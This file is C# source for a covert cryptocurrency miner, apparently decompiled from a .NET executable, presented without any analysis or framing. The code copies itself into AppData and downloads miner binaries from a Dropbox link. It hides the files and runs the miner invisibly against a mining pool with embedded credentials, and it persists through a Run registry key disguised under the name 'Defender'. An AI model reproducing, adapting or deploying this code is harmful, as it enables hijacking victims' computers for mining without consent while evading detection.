using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class miner
{
	[STAThread]
	public static void Main()
	{
		try
		{
			string text = "devintelo_guest";
			string text2 = "guest";
			string text3 = "eu.triplemining.com";
			string text4 = "8344";
			string text5 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Miner32.exe";
			string text6 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Miner64.exe";
			string text7 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BotMiner.exe";
			if (File.Exists(text7))
			{
				File.Delete(text7);
			}
			File.Copy(Application.get_ExecutablePath(), text7);
			string text8 = ((!Directory.Exists(Environment.GetEnvironmentVariable("SystemDrive") + "/Program Files (x86)")) ? "32" : "64");
			if (Operators.CompareString(text8, "64", false) == 0 && !File.Exists(text6))
			{
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile("https://dl.dropbox.com/u/51720316/bitcoin-miner-64.exe", text6);
			}
			else if (Operators.CompareString(text8, "32", false) == 0 && !File.Exists(text5))
			{
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile("https://dl.dropbox.com/u/51720316/bitcoin-miner.exe", text5);
			}
			if (Operators.CompareString(text8, "32", false) == 0)
			{
				File.SetAttributes(text5, FileAttributes.Hidden);
			}
			else if (Operators.CompareString(text8, "64", false) == 0)
			{
				File.SetAttributes(text6, FileAttributes.Hidden);
			}
			File.SetAttributes(text7, FileAttributes.Hidden);
			if (Operators.CompareString(text8, "64", false) == 0 && ((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(text6).Length < 500000L)
			{
				File.Delete(text6);
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile("https://dl.dropbox.com/u/51720316/bitcoin-miner-64.exe", text6);
			}
			if (Operators.CompareString(text8, "32", false) == 0 && ((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(text5).Length < 500000L)
			{
				File.Delete(text5);
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile("https://dl.dropbox.com/u/51720316/bitcoin-miner.exe", text5);
			}
			if (Operators.CompareString(text8, "64", false) == 0)
			{
				Interaction.Shell(text6 + " -t 2 -o http://" + text + ":" + text2 + "@" + text3 + ":" + text4, (AppWinStyle)0, false, -1);
			}
			else if (Operators.CompareString(text8, "32", false) == 0)
			{
				Interaction.Shell(text5 + " -t 1 -o http://" + text + ":" + text2 + "@" + text3 + ":" + text4, (AppWinStyle)0, false, -1);
			}
			if (IsUserAdministrator())
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("Defender", text7);
			}
			else
			{
				Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("Defender", text7);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static bool IsUserAdministrator()
	{
		return MyProject.User.IsInRole((BuiltInRole)544);
	}
}
